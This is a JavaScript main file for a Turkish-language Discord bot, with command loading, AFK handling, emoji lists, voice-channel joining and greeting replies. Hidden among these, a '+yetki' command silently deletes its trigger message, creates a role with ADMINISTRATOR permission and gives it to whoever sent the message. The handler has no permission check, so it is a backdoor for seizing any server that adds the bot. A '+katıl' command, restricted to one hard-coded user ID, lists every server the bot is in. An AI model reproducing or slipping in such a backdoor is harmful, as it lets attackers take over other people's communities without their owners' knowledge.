const discord = require('discord.js');
const fs = require('fs');
const http = require('http');
const db = require('quick.db');
const moment = require('moment')
const express = require('express');
const ayarlar = require('./ayarlar.json');
const app = express();
app.get("/", (request, response) => {
response.sendStatus(200);
});
app.listen(process.env.PORT);


//READY.JS

const Discord = require('discord.js');
const client = new Discord.Client();
client.on('ready', async () => {
   client.appInfo = await client.fetchApplication();
  setInterval( async () => {
    client.appInfo = await client.fetchApplication();
  }, 600);
  
 client.user.setActivity(`+yardım`, { type:'PLAYING' })
  
  console.log("A.Kayhan Code Systems")
});

const log = message => {
  console.log(` ${message}`);
};
require('./util/eventLoader.js')(client);

//READY.JS SON

//KOMUT ALGILAYICI

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
        let props = require(`./komutlar/${f}`);
        log(`Yüklenen komut: ${props.help.name}.`);
        client.commands.set(props.help.name, props);
        props.conf.aliases.forEach(alias => {
            client.aliases.set(alias, props.help.name);
        });
    });
});




client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
           reject(e);
        }
    });
};

client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./komutlar/${command}`);
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};




client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

//KOMUT ALGILAYICI SON

client.elevation = message => {
    if (!message.guild) {
        return;
    }
    let permlvl = 0;
    if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
    if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
    if (message.author.id === ayarlar.sahip) permlvl = 4;
    return permlvl;
};
client.login(process.env.TOKEN)

//botu sese sokma// -Lrows
  client.on("ready", () =>{
client.channels.cache.get('848231392487800902').join()
})
  client.on("ready", () =>{
client.channels.cache.get('584843108609687593').join()
})
  client.on("ready", () =>{
client.channels.cache.get('849337172532002839').join()
})
  client.on("ready", () =>{
client.channels.cache.get('775976327399342081').join()
}) 
  client.on("ready", () =>{
client.channels.cache.get('852658071057727558').join()
})
//afk//
client.on("message" , async msg => {
  
  if(!msg.guild) return;
  if(msg.content.startsWith(ayarlar.prefix+"afk")) return; 
  
  let afk = msg.mentions.users.first()
  
  const kisi = db.fetch(`afkid_${msg.author.id}_${msg.guild.id}`)
  
  const isim = db.fetch(`afkAd_${msg.author.id}_${msg.guild.id}`)
 if(afk){
   const sebep = db.fetch(`afkSebep_${afk.id}_${msg.guild.id}`)
   const kisi3 = db.fetch(`afkid_${afk.id}_${msg.guild.id}`)
   if(msg.content.includes(kisi3)){

       msg.reply(`**Etiketlediğiniz Kişi AFK!** \n**Sebep : ${sebep}**`)
   }
 }
  if(msg.author.id === kisi){

       msg.reply(`**Artık AFK Değil!**`)
   db.delete(`afkSebep_${msg.author.id}_${msg.guild.id}`)
   db.delete(`afkid_${msg.author.id}_${msg.guild.id}`)
   db.delete(`afkAd_${msg.author.id}_${msg.guild.id}`)
    msg.member.setNickname(isim)
    
  }
  
});
client.on('message', msg => {
  if (msg.content === '+emoji1') {
    msg.reply('<a:working1:851030848223313950><:developer:848240725094432798><:moderator3:851547103930744862><:moderator2:851547103506595851><:moderator:851547103146672178><:rozet:851547101023698954><:partner:851547100201484298><:admin:851547099337195550><:neonok:851547098771488769><:hmmok:851547098514980915><:sinirli:851547097835634719><:agac:851030850282848266><:owner:851030837612380182>',
);
  }
});
client.on('message', msg => {
  if (msg.content === '+emoji2') {
    msg.reply('<a:okkkkk:851143462778699816><a:tik3:851031639119495179><a:cevher1:848457326536294441><a:cevher2:851031639001792553><a:cevher3:851031628997984276><a:cevher:851031610060177408><a:zmrt:851031607379755028><a:kopke:851030881253982229><a:zpzp:851030874903412798><a:isleniyo:851030872580554762><a:papagan:851030871376003095><a:payvyon1:851030869677309962><a:pavyondc:851030858931372122><a:pavyon2:851030857799827497><a:pavyon3:851030853328699462><a:ates1:851030849050116096><a:ates2:851030845024370688><a:ates3:851030839567712296><a:ates4:848246110471585852><a:sagokk:851030846957551638><a:solokk:851030844993962014><a:ok1:848463877469765642><a:kalp1:851030838450978818><a:kalp2:851030837385232384><a:disk:850642795852464178><a:steve:850642524645097492><a:cekilis:850642500933648414><a:melek:850642495896420362><a:meow:848246159041757195><a:meowww:850642490289422346><a:giris:849581851759738920><a:cikis:849581840347168778><a:yklnyr:849581825852178432><a:duyuru2:848463868056961074><a:dikkat1:848463869475160064><a:logo1:848463867997716480><a:uyari:848463864713838623><a:tik2:848457339162066965><a:gemgif:848457335861018655><a:diamondz:848248076991987722><a:yukleniyo:848248069505155132><a:amogus:848246173676470331><a:pavyon1:848246161085431858><a:tik:848246144207159346><a:os1:848246123713265714><a:yldz:848246115350609952><a:diamond:848246113605255188>'
);
  }
  });
client.on("message", async msg => {
  let message = msg
   if (message.content === '+katıl') { // - yerine prefixi yaz
if(msg.author.id !== "393481789437640705") return;
var sunucular = client.guilds.cache.map(a=>a.name).join(",")
message.channel.send(sunucular)
}
});
client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
    msg.member.addRole(rol);
  }
});
//////////////////////////////////////////////////////////////////////////////////////
client.on("message", async msg => {
  if (msg.content.toLowerCase() === 'sa') {
    msg.reply('ve aleykum selam');
  }
});
client.on("message", async msg => {
  if (msg.content.toLowerCase() === 'selam') {
    msg.reply('ve aleykum selam');
  }
});
//////////////////////////////////////////////////////////sa-as yeri dokunma
